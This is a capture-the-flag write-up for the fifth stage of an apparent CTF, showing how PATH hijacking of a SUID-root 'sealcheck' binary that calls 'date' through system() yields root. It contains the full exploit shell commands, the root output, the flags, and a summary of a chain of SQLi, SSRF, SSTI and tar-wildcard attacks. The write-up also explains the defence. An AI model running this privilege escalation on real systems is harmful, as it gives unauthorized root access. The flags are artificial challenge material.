# Kepler's Office 5/5 — KEPLER's Signature

**Flag:** `reentry{p4th_h1j4ck3d_th3_su1d_s34lch3ck}`
**Override fragment:** `KEPLER-OVR-4:93c42eade707cd0a`

| | |
|---|---|
| Category | Local privesc kepler → root · SUID + PATH injection (GTFOBins-style) |
| Target | the office box over SSH (offline now) |
| Prereq | SSH as kepler (key installed in stage 4) |
| Files | none |

> **Challenge brief:** You have KEPLER's operator account, but the override loot — his signer, his
> key, the assembly recipe — belongs to root. A root-owned diagnostic tool KEPLER left running is
> sloppier than it looks. Get root, cut this office's override fragment.

---

## Short version

1. SSH as kepler (stage-4 key). The SUID-root binary is `/opt/office/sealcheck`
   (`-rwsr-xr-x root:root`).
2. `sealcheck` does `setuid(0)` and calls **`system()`** to print a timestamp — using **`date`
   with a relative path**.
3. Put our own `date` first in `PATH` → our script runs as **root**.
4. Read `/root/flag5.txt` and the override loot (`recipe.txt` + signer `kepsig`) → fragment
   **`KEPLER-OVR-4`**.

---

## 1. Find and analyze sealcheck

```bash
SSH="ssh -i kepler_key -p 22865 kepler@0.cloud.chals.io"
$SSH 'ls -la /opt/office/sealcheck'
# -rwsr-xr-x 1 root root ... (SUID root)
$SSH '/opt/office/sealcheck'
# MERIDIAN reel-seal diagnostic / verifying seal timestamp... / 2026-10-03T16:06:35Z
$SSH 'strings /opt/office/sealcheck | grep -E "system|setuid|date"'
# setuid  setgid  system
```

The printed ISO timestamp is the output of `system("date ...")`. The binary does `setuid(0)`
before `system()`, so the shell starts as root. `date` has no absolute path ⇒ **PATH injection**.

## 2. Exploit — PATH hijack

```bash
$SSH '
  rm -rf /tmp/x; mkdir -p /tmp/x
  cat > /tmp/x/date <<"EOF"
#!/bin/sh
{ id; cat /root/flag5.txt; } > /tmp/x/root.out 2>&1
chmod 666 /tmp/x/root.out
EOF
  chmod +x /tmp/x/date
  PATH=/tmp/x:$PATH /opt/office/sealcheck >/dev/null 2>&1
  cat /tmp/x/root.out
'
# uid=0(root) gid=0(root) ...
# reentry{p4th_h1j4ck3d_th3_su1d_s34lch3ck}
```

🚩 **Flag:** `reentry{p4th_h1j4ck3d_th3_su1d_s34lch3ck}`

## 3. Cut the override fragment

In `/root`: `flag5.txt`, `recipe.txt`, signer `kepsig` (all root-only). Read/run them the same way
(a fake `date` running as root):

```sh
cat /root/recipe.txt      # LAZARUS MASTER-OVERRIDE: 7 fragments, one per deck
/root/kepsig OVR-4        # this office's fragment
# fragment : KEPLER-OVR-4:93c42eade707cd0a
```

**Override fragment:** `KEPLER-OVR-4:93c42eade707cd0a` (collected in the
[README](../README.md) → *Master-override fragments*). `recipe.txt`: collect `KEPLER-OVR-1..7` from the seven decks and assemble
them at the Bridge to cancel REENTRY — the meta thread above this office.

> **Note:** The box is offline now, so this cannot be re-run. The override fragment matches the
> master list.

---

## Why it works / lessons

- SUID + `system()`/`popen()` with a command that has no absolute path = instant root via `PATH`.
  SUID binaries should not call a shell; if they must, use full paths, a cleaned `PATH`/`IFS`,
  `secure_getenv`, and ideally `execve` without a shell.
- `setuid(0)` + `system()` is a textbook anti-pattern (GTFOBins).

---

## Kepler's Office — complete (1–5)

| # | Name | Vulnerability | Flag |
|---|------|---------------|------|
| 1 | Operator Console | SQLi (SQLite) + case-sensitive WAF bypass | `reentry{un10n_b4s3d_1nt0_kepl3rs_c0ns0l3}` |
| 2 | Reel Mirror | SSRF + loopback filter bypass → 127.0.0.1:1977 | `reentry{ssrf_p1v0t_t0_th3_l00pb4ck_4dm1n}` |
| 3 | Diagnostics Report | Jinja2 SSTI + blocklist bypass → file read | `reentry{j1nj4_ss7i_burn3d_th3_0p3r4t0r}` |
| 4 | Root of the Matter | SSTI→RCE + tar wildcard injection (svc → kepler) | `reentry{t4r_w1ldc4rd_r0d3_kepl3rs_j0b}` |
| 5 | KEPLER's Signature | SUID + PATH injection (kepler → root) | `reentry{p4th_h1j4ck3d_th3_su1d_s34lch3ck}` |

**Chain:** public SQLi → operator account → SSRF to the internal admin → engineer token →
SSTI/RCE as `svc` → tar wildcard to `kepler` → SUID PATH-hijack to `root` → override fragment
**KEPLER-OVR-4:93c42eade707cd0a**.

> **Previous:** [4 - Root of the Matter](4%20-%20Root%20of%20the%20Matter.md)
>
> **Kepler's Office: 5/5 — COMPLETE.** 🏁
